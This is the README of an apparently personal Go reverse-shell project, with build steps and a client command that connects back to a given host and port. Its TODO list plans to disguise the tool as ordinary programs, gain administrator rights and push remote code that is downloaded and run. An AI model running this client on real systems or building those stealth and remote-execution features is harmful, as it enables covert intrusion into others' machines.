# GoReverSH
![ソースコードサイズ](https://img.shields.io/github/repo-size/geniusmaaakun/GoReverSH)
![言語](https://img.shields.io/github/languages/top/geniusmaaakun/GoReverSH)
![ライセンス](https://img.shields.io/github/license/geniusmaaakun/GoReverSH)


Rogo画像

# Author 
en@ble@ny

# Description
This is Golang ReverseShell

# Usage
config/config.jsonで出力ファイル設定


## Build
### IOS
make build
### Windows
make build_win

## RUN
### Server
./goreversh_server
### Client
./goreversh_client -host "host" -port "port"


実行画面の画像


## Test
make test


# TODO
- [ ] クライアントテストコード <- ここから
計画して一つずつ
connモックを使って読み込みするRead 


- [ ] makefile
変数　ビルドファイル名など

- [ ] color

- [ ] clean
    ファイル全削除


- [ ] upload　土日
    dir対応
    downloadを逆にする。
    クライアント側もオブザーバーパターンにする方がいい
    outをデコード　

- [ ] upload
特定のUrlのzipダウンロード、解答するコードを送りつけて実行するプログラム開発
もしくはDirectoryの場合は、zipを送りつけて解凍


- [ ] ダウンロード
    サイズ、パーミッション

- [ ] 出力ディレクトリ変更コマンド


- [ ] 別プログラムに偽装　バッチファイルなど
管理権限
別プログラムに偽装　普通のプログラムに仕込む
管理権限
画像表示コマンド　Windows
デスクトップアプリ　wails


- [ ] 暗号化
TLS -> AES共通鍵


- [ ] ロゴとアスキーアート

# 未実装
### Test
- [ ] TestWaitNotice
- [ ] TestClist
- [ ] CertTset

### 関数
- [ ] get hostname
- [ ] get currentuser


### Others
- [ ] ゴルーチンリークを注意

- [ ] build op make　でmainの変数に代入

- [ ] 操作ログを残す
logfile
出力をsetOutputで書き出し


- [ ] ダウンロードなどは、コネクション二つ貼ってやる方法もあり？
制御コマンド用と通信用


- [ ] 暗号化
base64でキーを埋め込み　RSA AESで暗号化
暗号文.共通鍵をサーバー側の秘密鍵で暗号化
クライアントは、公開鍵を受け取り複合化する


- [ ] TLSを使う？
実際は証明書を発行しないので、独自に暗号化する必要がある


- [ ] 自作ハッキングツール開発

- [ ] サーバー埋め込み型  クライアントコードにターゲットIPを埋め込む。もしくはconfig.jsonに入れる

- [ ] クライアント埋め込み型

- [ ] 管理者権限での実行方法　オプション？